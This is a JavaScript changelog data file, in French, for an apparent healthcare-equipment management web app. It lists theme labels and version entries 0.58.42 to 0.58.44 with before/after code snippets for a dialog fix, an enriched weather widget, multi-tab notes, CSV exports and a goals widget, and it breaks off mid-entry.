import { logger } from "../../lib/logger";
// =============================================================
//  app/changelog/versions-data.js
//  Historique complet auto-généré depuis les notes HTML
//  Alpha 0.54.0 — Régénération avec versions 0.52.7, 0.52.8, 0.53.0
// =============================================================

export const THEME_LABELS = {
  "rgpd": {
    "lbl": "RGPD & Consents",
    "icon": "ti-shield-lock",
    "color": "#8c2a23"
  },
  "achats": {
    "lbl": "Achats & Commandes",
    "icon": "ti-shopping-cart",
    "color": "#EF9F27"
  },
  "pwa": {
    "lbl": "PWA & Offline",
    "icon": "ti-device-mobile",
    "color": "#5a8f8f"
  },
  "ux": {
    "lbl": "UX & Design",
    "icon": "ti-palette",
    "color": "#7a6fb0"
  },
  "audit": {
    "lbl": "Audit & Logs",
    "icon": "ti-list-search",
    "color": "#5e4a8c"
  },
  "notifications": {
    "lbl": "Notifs & Annonces",
    "icon": "ti-bell",
    "color": "#EF9F27"
  },
  "rls_securite": {
    "lbl": "Sécurité & Droits",
    "icon": "ti-shield",
    "color": "#c0392b"
  },
  "patients": {
    "lbl": "Patients",
    "icon": "ti-user",
    "color": "#185FA5"
  },
  "maintenance": {
    "lbl": "Maintenance & DI",
    "icon": "ti-tool",
    "color": "#1c5454"
  },
  "perf_qualite": {
    "lbl": "Perf & Qualité",
    "icon": "ti-bolt",
    "color": "#EF9F27"
  },
  "realtime": {
    "lbl": "Realtime",
    "icon": "ti-broadcast",
    "color": "#7CC8C8"
  },
  "stats_dashboard": {
    "lbl": "Stats & Dashboards",
    "icon": "ti-chart-pie",
    "color": "#7a6fb0"
  },
  "transferts": {
    "lbl": "Transferts & Logistique",
    "icon": "ti-arrows-exchange",
    "color": "#5aa05a"
  },
  "recherche": {
    "lbl": "Recherche",
    "icon": "ti-search",
    "color": "#185FA5"
  },
  "infrastructure": {
    "lbl": "Infrastructure",
    "icon": "ti-server",
    "color": "#142131"
  },
  "documentation": {
    "lbl": "Documentation",
    "icon": "ti-book",
    "color": "#7CC8C8"
  },
  "geoloc": {
    "lbl": "Géolocalisation",
    "icon": "ti-map-pin",
    "color": "#5aa05a"
  },
  "templates": {
    "lbl": "Templates & Modèles",
    "icon": "ti-template",
    "color": "#7a6fb0"
  },
  "fixes": {
    "lbl": "Fixes & Hotfixes",
    "icon": "ti-bug",
    "color": "#c0392b"
  },
  "offline_pwa": {
    "lbl": "Offline & PWA",
    "icon": "ti-wifi-off",
    "color": "#5a8f8f"
  },
  "geographique": {
    "lbl": "Carte & Géoloc",
    "icon": "ti-map-pin",
    "color": "#185FA5"
  },
  "divers": {
    "lbl": "Divers",
    "icon": "ti-tag",
    "color": "#8a98a8"
  }
};

export const ALL_VERSIONS = [
  {
    "v": "0.58.44",
    "kind": "hotfix",
    "titre": "🩹 HOTFIX + UI : Fix dialogs.prompt + Météo enrichie (lieu, UV, lever/coucher, prévisions 3j) + Bannière widgets bonus",
    "chantiers": [
      { "code": "FIX", "txt": "🩹 FIX CRITIQUE : `dialogs.prompt is not a function` en prod. Le singleton `dialogs` exportait `confirm` et `alert` mais PAS `prompt`, alors que `Dialog.prompt()` existait déjà dans `ui-premium/Dialog.js` (depuis longtemps). Du coup tous les composants utilisant `dialogs.prompt` (LiensFavoris édition/ajout 0.58.39+, Notes addTab/renameTab 0.58.42, Objectifs addGoal/setCurrent 0.58.43) **plantaient en prod minifiée** avec `L.dialogs.prompt is not a function`. **Fix** : ajout de `dialogs.prompt(options)` qui délègue à `tryNewDialog('prompt', ...)` puis Dialog.prompt premium. Fallback `window.prompt()` natif en cas d'erreur d'import (très rare). Rétrocompat 100%",
        "code_snippet": {
          "file": "app/dialogs.js",
          "note": "Fix dialogs.prompt",
          "lang": "jsx",
          "before": "// AVANT 0.58.44 - dialogs.prompt MANQUANT du singleton\nexport const dialogs = {\n  confirm(options) { /* ... */ },\n  alert(options) { /* ... */ },\n  // ❌ pas de prompt !\n};\n\n// → en prod minifiée : L.dialogs.prompt is not a function 💥",
          "after": "// 0.58.44 - dialogs.prompt() ajouté + fallback window.prompt\nexport const dialogs = {\n  confirm(options) { /* ... */ },\n  alert(options) { /* ... */ },\n  prompt(options) {\n    const opts = options || {};\n    const newAttempt = tryNewDialog('prompt', {\n      title: opts.title || 'Saisie',\n      message: opts.message,\n      defaultValue: opts.defaultValue || '',\n      placeholder: opts.placeholder || '',\n      okLabel: opts.okLabel,\n      cancelLabel: opts.cancelLabel,\n    });\n    if (newAttempt) return newAttempt;\n    // Fallback : window.prompt natif si Dialog premium indispo\n    if (typeof window !== 'undefined' && window.prompt) {\n      const msg = [opts.title, opts.message].filter(Boolean).join('\\n');\n      const v = window.prompt(msg || 'Valeur :', opts.defaultValue || '');\n      return Promise.resolve(v);\n    }\n    return Promise.resolve(null);\n  },\n};"
        }
      },
      { "code": "UI", "txt": "🌤 MÉTÉO ENRICHIE : refonte du `WeatherWidget` pour afficher beaucoup plus d'infos. **(a)** **Nom du lieu** dans le titre via géocodage inverse (BAN api-adresse.data.gouv.fr pour la France + fallback Open-Meteo geocoding pour le mondial). Caché en localStorage avec la géoloc (TTL 24h). **(b)** **Min/max du jour** affichés à droite du bloc principal avec flèches ↑ rouge / ↓ bleu. **(c)** **Ressenti** sous la condition si écart ≥ 1°C. **(d)** Nouvelle **grille 4 colonnes** avec 8 infos : Vent + direction cardinale (N/NE/E/SE/S/SO/O/NO), Humidité, Pression hPa, Visibilité km, UV avec label coloré (Faible/Modéré/Élevé/Très élevé), Couverture nuageuse %, Lever 🌅, Coucher 🌇. **(e)** **Bloc précipitations** dédié si pluie en cours ou prévue ce jour",
        "code_snippet": {
          "file": "app/components/DashboardWidgets.js",
          "note": "Météo enrichie",
          "lang": "jsx",
          "before": "// AVANT 0.58.44 - infos minimales (temp + condition + vent + humidité)\nconst url = `https://api.open-meteo.com/v1/forecast?latitude=${geo.lat}&longitude=${geo.lng}` +\n  `&current=temperature_2m,weather_code,wind_speed_10m,relative_humidity_2m&timezone=auto`;\n\n// Pas de nom de ville, pas de min/max, pas de lever/coucher, pas d'UV, etc.",
          "after": "// 0.58.44 - infos enrichies (current + daily + géocodage)\n\n// 1) Géocodage inverse pour le nom de la ville (BAN puis fallback Open-Meteo)\nconst banUrl = `https://api-adresse.data.gouv.fr/reverse/?lon=${geo.lng}&lat=${geo.lat}`;\nconst feature = json?.features?.[0];\nconst locationName = feature?.properties?.city || feature?.properties?.name;\n\n// 2) API enrichie : current (10 valeurs) + daily 4 jours\nconst url = `https://api.open-meteo.com/v1/forecast?latitude=${geo.lat}&longitude=${geo.lng}` +\n  `&current=temperature_2m,apparent_temperature,weather_code,wind_speed_10m,wind_direction_10m,` +\n  `relative_humidity_2m,precipitation,pressure_msl,cloud_cover,visibility` +\n  `&daily=weather_code,temperature_2m_max,temperature_2m_min,precipitation_sum,sunrise,sunset,` +\n  `uv_index_max,wind_speed_10m_max&timezone=auto&forecast_days=4`;\n\n// 3) Helpers\nfunction windDirCardinal(deg) {\n  const dirs = ['N', 'NE', 'E', 'SE', 'S', 'SO', 'O', 'NO'];\n  return dirs[Math.round(deg / 45) % 8];\n}\n\n// 4) Couleur UV adaptative\nconst uvColor = uv <= 2 ? '#5aa05a' : uv <= 5 ? '#EF9F27' : uv <= 7 ? '#e35d5b' : '#7a3030';\nconst uvLabel = uv <= 2 ? 'Faible' : uv <= 5 ? 'Modéré' : uv <= 7 ? 'Élevé' : 'Très élevé';\n\n// 5) Titre avec nom du lieu\n<h2>🌤 Météo · <span>{state.locationName || ''}</span></h2>"
        }
      },
      { "code": "UI", "txt": "📅 PRÉVISIONS 3 JOURS (toggle) : nouveau bouton calendrier dans le widget météo qui affiche/masque une grille des 3 prochains jours. Chaque jour : nom court (Lun, Mar, Mer), emoji météo géant 26px, max/min avec couleurs (rouge/bleu). Background semi-transparent pour bien marquer la section. Permet d'avoir une vue rapide sur les jours à venir sans changer de page",
        "code_snippet": {
          "file": "app/components/DashboardWidgets.js",
          "note": "Forecast 3 jours",
          "lang": "jsx",
          "before": "// AVANT 0.58.44 - widget météo = current uniquement, pas de prévisions",
          "after": "// 0.58.44 - prévisions 3 jours avec toggle\nconst [showForecast, setShowForecast] = useState(false);\n\n{showForecast && state.forecast && (\n  <div style={{ borderTop: '1px solid #bce0f7', paddingTop: 10 }}>\n    <div>📅 Prévisions 3 jours</div>\n    <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: 6 }}>\n      {state.forecast.time.slice(1, 4).map((iso, i) => {\n        const fcWmo = WMO[state.forecast.weather_code[i + 1]];\n        return (\n          <div style={{ textAlign: 'center', padding: '8px 6px' }}>\n            <div>{formatDayShort(iso)}</div>      {/* Lun, Mar, Mer */}\n            <div style={{ fontSize: 26 }}>{fcWmo.e}</div>\n            <div>\n              <b style={{ color: '#e35d5b' }}>{Math.round(fcMax)}°</b>\n              {' / '}\n              <b style={{ color: '#2a7ed1' }}>{Math.round(fcMin)}°</b>\n            </div>\n          </div>\n        );\n      })}\n    </div>\n  </div>\n)}"
        }
      },
      { "code": "UI", "txt": "🎁 BANNIÈRE WIDGETS BONUS + BADGE 'PERSONNALISER' : pour résoudre le souci 'je vois pas les widgets'. **(a)** Badge orange `🟠 N` sur le bouton 'Personnaliser' qui montre le nombre de widgets opt-in non encore activés (3px en haut à droite, gradient amber, glow). **(b)** **Bannière d'invitation** au-dessus du dashboard si des widgets bonus sont disponibles : affiche jusqu'à 6 widgets avec leur icône colorée + bouton 'Découvrir' qui ouvre directement le panel de personnalisation. Dismissable (croix ✕ → flag `localStorage av-widgets-banner-dismissed`). Disparaît automatiquement quand tous les widgets sont activés ou pendant le mode édition. Préfixe `av-` pour purge au logout",
        "code_snippet": {
          "file": "app/accueil/page.js",
          "note": "Banner widgets",
          "lang": "jsx",
          "before": "// AVANT 0.58.44 - widgets opt-in invisibles si user ne sait pas qu'ils existent\n<button onClick={() => setEditLayout(!editLayout)}>\n  <i className='ti ti-layout-dashboard' /> Personnaliser\n</button>\n\n// Aucune indication des widgets bonus dispos",
          "after": "// 0.58.44 - badge + bannière d'invitation\n\n// 1) Badge sur le bouton\nconst hiddenOptIn = ALL_WIDGETS.filter(w => !widgets[w.id]);\n<button onClick={() => setEditLayout(!editLayout)} style={{ position: 'relative' }}>\n  <i className='ti ti-layout-dashboard' /> Personnaliser\n  {!editLayout && hiddenOptIn.length > 0 && (\n    <span style={{\n      position: 'absolute', top: -6, right: -6,\n      background: 'linear-gradient(135deg, #EF9F27, #d28818)',\n      color: '#fff', minWidth: 18, height: 18, borderRadius: 9,\n      border: '2px solid #fff',\n    }}>{hiddenOptIn.length}</span>\n  )}\n</button>\n\n// 2) Bannière d'invitation\n{!editLayout && !bannerDismissed && hiddenOptIn.length > 0 && (\n  <div style={{ background: 'linear-gradient(135deg, rgba(239,159,39,.10), rgba(124,200,200,.08))' }}>\n    🎁 <b>{hiddenOptIn.length} widgets bonus disponibles</b> :\n    {hiddenOptIn.slice(0, 6).map(w => <span><i className={w.icon} />{w.label}</span>)}\n    <button onClick={() => setEditLayout(true)}>✨ Découvrir</button>\n    <button onClick={() => { localStorage.setItem('av-widgets-banner-dismissed', 'true'); setBannerDismissed(true); }}>✕</button>\n  </div>\n)}"
        }
      },
      { "code": "AI", "txt": "+25 tests Vitest (v058-44-bundle.test.js) : version+SW (2), dialogs.prompt fix (4 — exposé, délègue Dialog premium, props transmises, fallback window.prompt), WeatherWidget enrichi (13 — state, géocodage BAN+fallback, API enrichie, daily, helpers, locationName affiché, toggle prévisions, UV colors, min/max, précipitations, grille infos), bannière widgets (6 — badge, dismissable, state, bouton Découvrir, preview 6 widgets, conditions de masquage). Total **~4450 verts estimés**" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.44 : **bug prod critique** corrigé (dialogs.prompt qui plantait sur Notes/Objectifs/LiensFavoris). **Météo** transformée en mini-station météo complète avec lieu, ressenti, min/max, UV coloré, lever/coucher, visibilité, pression, couverture nuageuse, précipitations, prévisions 3 jours. **Widgets bonus** maintenant **visibles** via badge + bannière d'invitation contextuelle. Note pour info routière demandée : pas d'API gratuite/sans clé fiable pour ça (Waze/Google nécessitent clé payante, Bison Futé est uniquement journaliers en HTML). On peut intégrer plus tard via une clé API si tu en obtiens une. PROCHAINES PISTES (0.58.45+) : (a) Widget Trafic routier avec API Mappy/TomTom si clé fournie. (b) Bannière météo intempéries (alertes Météo France). (c) Drag&drop colonnes Crud. (d) Notes : insertion d'images via dataURL paste" }
    ],
    "themes": ["fix", "ui", "wow"],
    "date": "5 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.44.html",
    "sqlFile": null
  },
  {
    "v": "0.58.43",
    "kind": "version",
    "titre": "🎁 BUNDLE : Exports CSV factorisés + Ctrl+Shift+X Notes + Widget Mes objectifs (11e widget)",
    "chantiers": [
      { "code": "ARCH", "txt": "📊 EXPORTS CSV FACTORISÉS : `usePageAction('export-csv')` désormais branché sur 3 pages supplémentaires en plus de /patients. **(a)** `/interventions` : nouvelle fonction `exportInterventionsCsv()` qui exporte toutes les DI visibles (respecte fStatut, fType ET filtre contexte ctx.active). Colonnes : Numéro, Date, Type, Urgence, Statut, Matériel, Patient, Chambre, Description. **(b)** `/materiels` : l'export inline existant a été extrait en fonction réutilisable `exportMaterielsCsv()` qui respecte aussi le filtre contexte si actif. **(c)** `/maintenance` : nouvelle fonction `exportMaintenancesCsv()` + **nouveau bouton 'Export CSV'** dans la toolbar à côté de l'Export PDF (la page n'avait que PDF avant). Bilan : **4 pages** ont maintenant `usePageAction('export-csv')` (patients, interventions, materiels, maintenance)",
        "code_snippet": {
          "file": "app/interventions/page.js + app/materiels/page.js + app/maintenance/page.js",
          "note": "Exports CSV + Cmd+K",
          "lang": "jsx",
          "before": "// AVANT 0.58.43 - exports CSV présents mais inaccessibles depuis Cmd+K\n// /patients : usePageAction OK (depuis 0.58.42)\n// /interventions : bulkExportCsv seulement sur la sélection, pas l'ensemble\n// /materiels : export inline dans le onClick du bouton (pas factorisable)\n// /maintenance : pas d'export CSV du tout (juste PDF)",
          "after": "// 0.58.43 - 3 pages factorisées + branchées à Cmd+K\n\n// /interventions/page.js\nasync function exportInterventionsCsv() {\n  const data = rows.filter((r) => {\n    if (fStatut && r.statut !== fStatut) return false;\n    if (fType && r.type !== fType) return false;\n    if (ctx.active && ctxPatientIds && !ctxPatientIds.has(r.patient_id)) return false;\n    return true;\n  });\n  const { exportRows } = await import('../../lib/exportExcel');\n  await exportRows(data, { filename: `interventions_...`, columns: {...} });\n}\nusePageAction('export-csv', () => exportInterventionsCsv());\n\n// /materiels/page.js : extraction de l'inline\nasync function exportMaterielsCsv() {\n  const data = (ctx.active && ctxPatientIds)\n    ? items.filter(r => r.patient_id && ctxPatientIds.has(r.patient_id))\n    : items;\n  // ...\n}\n<button onClick={exportMaterielsCsv}>Export CSV</button>  // ← appel direct factorisé\nusePageAction('export-csv', () => exportMaterielsCsv());\n\n// /maintenance/page.js : nouveau\nasync function exportMaintenancesCsv() {\n  let data = rows;\n  if (fStatut) data = data.filter(...);\n  if (ctx.active && ctxMaterielIds) data = data.filter(...);\n  // ...\n}\n<Btn icon='ti-file-spreadsheet' onClick={exportMaintenancesCsv}>Export CSV</Btn>\nusePageAction('export-csv', () => exportMaintenancesCsv());"
        }
      },
      { "code": "UI", "txt": "⌨️ NOTES : RACCOURCI `Ctrl+Shift+X` POUR TOGGLE CHECKBOX EN ÉDITION. En mode édition de note, presser `Ctrl+Shift+X` (ou `Cmd+Shift+X` sur Mac) sur une ligne effectue **3 actions intelligentes** : **(a)** Si la ligne est déjà une checkbox `- [ ]` ou `- [x]` → toggle l'état. **(b)** Si la ligne est une liste bulletée `- texte` → la convertit en checkbox vide `- [ ] texte`. **(c)** Si c'est une ligne de texte normal → la convertit en `- [ ] texte`. Repère la ligne du curseur via `selectionStart` + accumulation de longueur des lignes. Hint mis à jour dans le textarea pour mentionner le raccourci",
        "code_snippet": {
          "file": "app/components/DashboardWidgets.js",
          "note": "Ctrl+Shift+X",
          "lang": "jsx",
          "before": "// AVANT 0.58.43 - pour cocher, il fallait taper manuellement [x]\n// Pas pratique en mode édition rapide\n<textarea\n  value={text}\n  onChange={(e) => updateActiveText(e.target.value)}\n/>",
          "after": "// 0.58.43 - raccourci Ctrl+Shift+X intelligent\n<textarea\n  value={text}\n  onChange={(e) => updateActiveText(e.target.value)}\n  onKeyDown={(e) => {\n    if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'x' || e.key === 'X')) {\n      e.preventDefault();\n      const pos = e.target.selectionStart;\n      const lines = text.split('\\n');\n      // Trouve la ligne du curseur\n      let acc = 0, lineIdx = 0;\n      for (let i = 0; i < lines.length; i++) {\n        if (pos <= acc + lines[i].length) { lineIdx = i; break; }\n        acc += lines[i].length + 1;\n      }\n      const line = lines[lineIdx];\n      const m = line.match(/^(\\s*)(-\\s*\\[)([\\sxX])(\\]\\s.*)$/);\n      if (m) {\n        // Toggle existante\n        const wasChecked = m[3].toLowerCase() === 'x';\n        lines[lineIdx] = m[1] + m[2] + (wasChecked ? ' ' : 'x') + m[4];\n      } else if (line.trim().startsWith('- ')) {\n        // Convert bullet → checkbox\n        lines[lineIdx] = `- [ ] ${line.trim().slice(2)}`;\n      } else if (line.trim()) {\n        // Convert texte → checkbox\n        lines[lineIdx] = `- [ ] ${line.trim()}`;\n      } else {\n        // Ligne vide → nouvelle checkbox\n        lines[lineIdx] = '- [ ] ';\n      }\n      updateActiveText(lines.join('\\n'));\n    }\n  }}\n/>"
        }
      },
      { "code": "UI", "txt": "🎯 NOUVEAU WIDGET : MES OBJECTIFS (11e widget). Widget opt-in pour suivre des objectifs personnels avec progress bars. **(a)** Jusqu'à 6 objectifs (GOALS_MAX). Chaque objectif : `{ id, label, current, target, unit, colorId }`. **(b)** 6 couleurs au choix (navy, teal, terra, amber, green, blue) attribuées en rotation. **(c)** Progress bar avec gradient + marqueurs aux 25%/50%/75% (milestones). **(d)** Style spécial 'isComplete' : gradient vert + glow + icône check. **(e)** Boutons rapides `+1`, `+5`, `-1` pour incrémenter sans dialogue. **(f)** Cliquer sur le label ou l'icône crayon pour saisir une valeur précise. Storage `av-personal-goals` (purgeable au logout via préfixe 'av-')",
        "code_snippet": {
          "file": "app/components/DashboardWidgets.js + lib/dashboardLayout.js",
          "note": "Widget Objectifs",
          "lang": "jsx",
          "before": "// AVANT 0.58.43 - 10 widgets dashboard\nexport const ALL_WIDGETS = [\n  /* 5 base + 5 opt-in (citation, mini-calendrier, liens-favoris, meteo, notes) */\n];",
          "after": "// 0.58.43 - 11 widgets (+ objectifs)\nexport const ALL_WIDGETS = [\n  /* ... 10 précédents */\n  { id: 'objectifs', label: 'Mes objectifs', icon: 'ti-target', color: '#185FA5' },\n];\n\nconst GOALS_STORAGE_KEY = 'av-personal-goals';\nconst GOALS_MAX = 6;\nconst GOAL_COLORS = [\n  { id: 'navy', bg: '#142131', grad: 'linear-gradient(90deg, #142131, #2a3850)' },\n  { id: 'teal', bg: '#7CC8C8', grad: '...' },\n  { id: 'terra', bg: '#C9867F', grad: '...' },\n  // ... 6 couleurs\n];\n\nexport function ObjectifsWidget() {\n  const [goals, setGoals] = useState([]);\n\n  // Progress bar avec milestones 25/50/75 + glow si complete\n  return goals.map(g => {\n    const pct = Math.min(100, (g.current / g.target) * 100);\n    const isComplete = g.current >= g.target;\n    return (\n      <div>\n        <span>{g.label}</span>\n        <span>{g.current} / {g.target} {g.unit} {Math.round(pct)}%</span>\n        <div style={{ width: '100%', height: 10, background: '#e3e9ee' }}>\n          <div style={{\n            width: `${pct}%`,\n            background: isComplete ? 'linear-gradient(90deg, #5aa05a, #4a8a4a)' : color.grad,\n            boxShadow: isComplete ? '0 0 8px rgba(90,160,90,.50)' : `0 0 6px ${color.bg}40`,\n          }} />\n          {[25, 50, 75].map(m => <div style={{ position: 'absolute', left: `${m}%` }} />)}\n        </div>\n        {/* Boutons rapides */}\n        <button onClick={() => quickIncrement(g.id, 1)}>+1</button>\n        <button onClick={() => quickIncrement(g.id, 5)}>+5</button>\n        <button onClick={() => quickIncrement(g.id, -1)}>-1</button>\n      </div>\n    );\n  });\n}"
        }
      },
      { "code": "DOC", "txt": "ℹ️ FILTRE CTX SUR /signalements RECONFIRMÉ COMME NON-APPLICABLE : analyse du schéma signalements — pas de `patient_id`, `materiel_id`, `batiment_id`, `service_id` direct. Les signalements concernent souvent toute la collectivité (organisation, hygiène, sécurité...) sans rattachement à un patient/équipement précis. Donc pas de filtre contexte sur cette page (skip définitif). Si le schéma évolue dans le futur pour ajouter une localisation, la piste sera réactivable" },
      { "code": "AI", "txt": "+30 tests Vitest (v058-43-bundle.test.js) : version+SW (2), exports CSV factorisés (5 — /interventions, /materiels, /maintenance avec filtres respectés), Notes Ctrl+Shift+X (4 — onKeyDown, selectionStart, toggle smart, hint), Widget Objectifs (7 — export, storage key, max 6, palette 6 couleurs, fonctions CRUD+quickIncrement, milestones 25/50/75, complete style), dashboardLayout objectifs (3), /accueil objectifs (2). Total **~4425 verts estimés**" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.43 : Cmd+K avec `export-csv` fonctionne maintenant sur **4 pages** (patients, interventions, materiels, maintenance). Les exports respectent automatiquement les filtres actifs (statut, type, contexte bât/svc). Le widget Notes a un raccourci clavier puissant pour to-do lists. Le dashboard compte **11 widgets** (5 base + 6 opt-in). PROCHAINES PISTES (0.58.44+) : (a) Drag&drop pour réordonner les colonnes du tableau Crud (paramètres profil). (b) Widget '📈 Suivi mensuel' avec graphique mini sur les KPIs perso. (c) Notes : insertion d'images via dataURL paste. (d) Étendre usePageAction sur d'autres pages (/commandes, /achats, /transferts). (e) Mode 'présentation' pour widget Objectifs : grand affichage pour réunions" }
    ],
    "themes": ["ui", "feature", "wow"],
    "date": "5 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.43.html",
    "sqlFile": null
  },
  {
    "v": "0.58.42",
    "kind": "version",
    "titre": "🎁 BUNDLE : Notes multi-onglets + checkboxes to-do + filtre /maintenance + Cmd+K page-actions",
    "chantiers": [
      { "code": "UI", "txt": "📝 NOTES MULTI-ONGLETS : refonte du `NotesWidget` pour supporter **jusqu'à 4 notes simultanées** (NOTES_MAX_TABS=4). Nouveau format storage `av-personal-notes-v2` : `{ tabs: [{ id, label, text }], activeId }`. Migration auto depuis l'ancien format string (`av-personal-notes`) → première note 'Note' contenant l'ancien texte. Barre d'onglets en haut du widget : tab actif jaune Aveho `#EF9F27` (couleur vif), tabs inactifs en navy `#7a4f15`. Sur le tab actif : boutons crayon (renommer) et ✕ (supprimer avec confirm). Bouton 'Nouvelle' en pointillé pour ajouter une note (titre max 30 caractères). Protection : au moins une note doit rester (anti-suppression de la dernière)",
        "code_snippet": {
          "file": "app/components/DashboardWidgets.js",
          "note": "Notes multi-tabs",
          "lang": "jsx",
          "before": "// AVANT 0.58.42 - 1 seule note\nconst NOTES_STORAGE_KEY = 'av-personal-notes';  // string simple\nconst [text, setText] = useState('');\n\nexport function NotesWidget() {\n  // Une seule textarea, une seule note\n  return <textarea value={text} onChange={...} />;\n}",
          "after": "// 0.58.42 - jusqu'à 4 notes avec onglets\nconst NOTES_STORAGE_KEY = 'av-personal-notes-v2';\nconst NOTES_LEGACY_KEY = 'av-personal-notes';  // migration v1→v2\nconst NOTES_MAX_TABS = 4;\n\nfunction getNotesData() {\n  // Tente v2 (format objet)\n  const raw = localStorage.getItem(NOTES_STORAGE_KEY);\n  if (raw) {\n    const parsed = JSON.parse(raw);\n    if (parsed?.tabs && Array.isArray(parsed.tabs)) {\n      return { tabs: parsed.tabs, activeId: parsed.activeId };\n    }\n  }\n  // Fallback v1 (string) → migration\n  const legacy = localStorage.getItem(NOTES_LEGACY_KEY);\n  if (legacy) {\n    return { tabs: [{ id: 'default', label: 'Note', text: legacy }], activeId: 'default' };\n  }\n  return { tabs: [{ id: 'default', label: 'Note', text: '' }], activeId: 'default' };\n}\n\nexport function NotesWidget() {\n  const [data, setData] = useState(...);\n  const activeTab = data.tabs.find(t => t.id === data.activeId);\n\n  return (\n    <>\n      {/* Barre d'onglets */}\n      <div>\n        {data.tabs.map(tab => <div onClick={() => setData(p => ({ ...p, activeId: tab.id }))}>...</div>)}\n        {data.tabs.length < 4 && <button onClick={addTab}>+ Nouvelle</button>}\n      </div>\n      <textarea value={activeTab.text} onChange={...} />\n    </>\n  );\n}"
        }
      },
      { "code": "UI", "txt": "☑️ CHECKBOXES TO-DO `[ ]` / `[x]` : extension du mini-parser markdown pour supporter les listes de cases à cocher. Syntaxe : `- [ ] truc à faire` (vide) ou `- [x] truc fait` (coché). Regex de détection : `/^-\\s*\\[[\\sxX]\\]\\s/`. **Interactif** : en mode preview (pas édition), cliquer sur une case toggle l'état dans le texte source — la fonction `toggleCheckbox(targetIdx)` retrouve la N-ième checkbox dans le texte et flip le `' '` ↔ `'x'`. Style : case `14x14` avec bordure dorée `#d4c896` quand vide, fond vert `#5aa05a` avec ✓ blanc quand cochée. Texte coché : strikethrough + couleur grise. Sécurité maintenue : escape HTML d'abord, puis pattern matching sur le texte échappé",
        "code_snippet": {
          "file": "app/components/DashboardWidgets.js",
          "note": "Checkboxes",
          "lang": "jsx",
          "before": "// AVANT 0.58.42 - juste les listes bulletées\nconst allBullets = lines.every(l => l.trim().startsWith('- '));\nif (allBullets) {\n  return <ul>{lines.map(l => <li>{inlineMd(l.replace(/^- /, ''))}</li>)}</ul>;\n}",
          "after": "// 0.58.42 - + checkboxes interactives\nconst allCheckboxes = lines.every(l => /^-\\s*\\[[\\sxX]\\]\\s/.test(l.trim()));\nif (allCheckboxes) {\n  return (\n    <ul style={{ listStyle: 'none' }}>\n      {lines.map((l, j) => {\n        const m = l.trim().match(/^-\\s*\\[([\\sxX])\\]\\s(.*)$/);\n        const checked = m[1].toLowerCase() === 'x';\n        const content = m[2];\n        const lineIdx = globalLineIdx++;\n        return (\n          <li style={{ display: 'flex', gap: 6 }}>\n            <span onClick={() => onToggleCheckbox(lineIdx)}\n                  style={{\n                    width: 14, height: 14, borderRadius: 3,\n                    border: `2px solid ${checked ? '#5aa05a' : '#d4c896'}`,\n                    background: checked ? '#5aa05a' : 'transparent',\n                    cursor: 'pointer',\n                  }}>\n              {checked && <i className='ti ti-check' />}\n            </span>\n            <span style={{\n              textDecoration: checked ? 'line-through' : 'none',\n              color: checked ? '#8a98a8' : '#142131',\n            }}>{inlineMd(content)}</span>\n          </li>\n        );\n      })}\n    </ul>\n  );\n}\n\n// toggleCheckbox : retrouve la N-ième case dans le texte et flip ' ' <-> 'x'\nfunction toggleCheckbox(targetIdx) {\n  let cbIdx = -1;\n  const updated = text.split('\\n').map(line => {\n    const m = line.match(/^(\\s*-\\s*\\[)([\\sxX])(\\]\\s.*)$/);\n    if (m) {\n      cbIdx++;\n      if (cbIdx === targetIdx) {\n        return m[1] + (m[2].toLowerCase() === 'x' ? ' ' : 'x') + m[3];\n      }\n    }\n    return line;\n  });\n  updateActiveText(updated.join('\\n'));\n}"
        }
      },
      { "code": "UI", "txt": "🔍 FILTRE CONTEXTE SUR /maintenance : pattern hooks réutilisable étendu à la 4e page. Particularité : **3 niveaux de jointure** Supabase (chambres → patients → matériels) car les maintenances sont rattachées à des matériels qui sont rattachés à des patients qui sont dans des chambres. `ctxMaterielIds` est un Set des `materiel_id` dans le contexte. Filtre : `if (ctx.active && ctxMaterielIds) r = r.filter(row => row.materiel_id && ctxMaterielIds.has(row.materiel_id))`. Bouton toggle UI à côté de l'export PDF. **Bilan** : le pattern est maintenant déployé sur **4 listes** (/patients, /interventions, /materiels, /maintenance)" },
      { "code": "ARCH", "txt": "🪝 HOOK RÉUTILISABLE `usePageAction` : `lib/usePageAction.js`. Permet à n'importe quelle page d'écouter les actions contextuelles déclenchées depuis Cmd+K. **(a)** Cmd+K émet `window.dispatchEvent(new CustomEvent('av-page-action', { detail: { action, path } }))`. **(b)** La page écoute via le hook : `usePageAction('export-csv', () => exportCsv())`. **(c)** Cleanup auto via `removeEventListener` au démontage. Permet de découpler le Cmd+K des pages — pas besoin de modifier GlobalSearch quand on ajoute une nouvelle action sur une page, juste de déclarer le handler",
        "code_snippet": {
          "file": "lib/usePageAction.js (NEW)",
          "note": "usePageAction hook",
          "lang": "jsx",
          "before": "// AVANT 0.58.42 - Cmd+K ne pouvait que naviguer (router.push)\n// Pas de moyen de déclencher une action arbitraire sur une page\n// (ex: ouvrir un modal, exporter, toggle un filtre)",
          "after": "// 0.58.42 - lib/usePageAction.js (NEW)\nimport { useEffect } from 'react';\n\nexport function usePageAction(actionName, handler) {\n  useEffect(() => {\n    if (!actionName || !handler) return;\n    function onPageAction(e) {\n      if (e?.detail?.action === actionName) {\n        handler();\n      }\n    }\n    window.addEventListener('av-page-action', onPageAction);\n    return () => window.removeEventListener('av-page-action', onPageAction);\n  }, [actionName, handler]);\n}\n\n// Usage côté page\nusePageAction('open-new', () => setModal({}));\nusePageAction('export-csv', () => exportRows(rows, {...}));\nusePageAction('toggle-ctx-filter', () => ctx.toggle());"
        }
      },
      { "code": "UI", "txt": "🎯 CMD+K PAGE-ACTIONS CONTEXTUELLES : enrichissement massif du tableau `ACTIONS` dans `GlobalSearch.js`. **(a)** +3 actions de création (Ajouter un matériel, Planifier une maintenance, Créer un dépôt). **(b)** +5 actions navigation contextuelles (Liste patients depuis fiche patient, Liste DI depuis kanban, Inventaire depuis fiche matériel, Vue collectivité, Vue globale, Tableau direction, Changelog). **(c)** +5 page-actions avec URL `#page-action:xxx` qui émettent un event au lieu de naviguer : **export-csv** (patients/DI/matériels/signalements), **toggle-ctx-filter** (4 pages), **open-new** (9 pages). Total ACTIONS passe de 16 à **30 actions**",
        "code_snippet": {
          "file": "app/GlobalSearch.js",
